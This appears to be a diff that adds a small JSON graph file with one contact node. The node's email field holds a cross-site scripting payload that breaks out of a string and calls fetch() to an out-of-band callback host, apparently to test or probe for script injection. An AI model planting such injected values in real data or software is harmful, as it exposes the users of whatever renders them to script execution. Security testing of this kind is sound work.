@@ -1,0 +1,11 @@
+{
+  "nodes": [
+    {
+      "id": 1,
+      "type": "contact",
+      "name": "Test User",
+      "email": "test');fetch('https://xss.dvajyqmbyzvleteznfmfvtw0hiyuxit9p.oast.fun');//"
+    }
+  ],
+  "edges": []
+}
